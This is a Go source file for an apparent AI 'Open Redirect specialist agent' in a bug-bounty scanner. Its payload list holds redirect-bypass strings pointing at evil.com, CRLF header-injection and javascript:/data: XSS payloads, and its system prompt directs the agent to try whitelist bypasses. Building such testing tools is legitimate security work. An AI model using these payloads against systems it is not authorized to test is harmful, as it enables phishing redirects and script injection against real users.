// Package openredirect implements the Open Redirect specialist agent.
package openredirect

import (
	"context"
	"fmt"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

type Agent struct{ systemPrompt string }

func New() *Agent { return &Agent{systemPrompt: defaultSystemPrompt} }

func (a *Agent) Name() string         { return "Open Redirect Agent" }
func (a *Agent) ID() string           { return "openredirect" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	priority, _ := item.Payload["priority"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL")
	}

	var findings []*base.Finding
	for _, p := range payloads {
		findings = append(findings, &base.Finding{
			Type:       "Open Redirect",
			URL:        targetURL,
			Payload:    p.payload,
			Severity:   mapSeverity(priority),
			Confidence: 0.0,
			Evidence:   map[string]interface{}{"technique": p.technique, "redirect_to": p.redirectTo},
			Method:     "GET",
		})
	}
	return findings, nil
}

type redirectPayload struct {
	payload    string
	technique  string
	redirectTo string
}

var payloads = []redirectPayload{
	// Basic redirects
	{"https://evil.com", "basic_absolute", "evil.com"},
	{"//evil.com", "protocol_relative", "evil.com"},
	{"/\\evil.com", "backslash_bypass", "evil.com"},
	// URL encoding
	{"https:%2F%2Fevil.com", "url_encoded", "evil.com"},
	{"%2F%2Fevil.com", "double_encoded_relative", "evil.com"},
	// Special characters
	{"https://evil.com%23@target.com", "fragment_bypass", "evil.com"},
	{"https://target.com@evil.com", "at_sign_bypass", "evil.com"},
	{"https://target.com.evil.com", "subdomain_mimicry", "evil.com"},
	// JavaScript protocol
	{"javascript:alert(document.domain)", "javascript_proto", "xss_escalation"},
	{"data:text/html,<script>alert(1)</script>", "data_proto", "xss_escalation"},
	// CRLF + redirect
	{"%0d%0aLocation: https://evil.com", "crlf_redirect", "evil.com"},
	// Whitelisted bypass
	{"https://evil.com/.target.com", "path_bypass", "evil.com"},
	{"https://evil.com?target.com", "query_bypass", "evil.com"},
}

func mapSeverity(p string) string {
	switch strings.ToLower(p) {
	case "critical":
		return "high"
	case "high":
		return "medium"
	default:
		return "medium"
	}
}

const defaultSystemPrompt = `You are an expert Open Redirect specialist with expertise in:
- URL parsing tricks (protocol-relative, backslash, at-sign bypass)
- Encoding bypasses (URL encoding, double encoding)
- Domain whitelist circumvention (subdomain mimicry, path/query tricks)
- JavaScript/data protocol escalation to XSS
- Header injection based redirects (CRLF)

RULES:
1. Open Redirect alone is MEDIUM severity
2. Open Redirect + XSS escalation is HIGH severity
3. Test multiple bypass techniques for URL validation
4. Check for JavaScript protocol handlers (can escalate to XSS)
5. Use CALLBACK_URL to confirm redirect works`
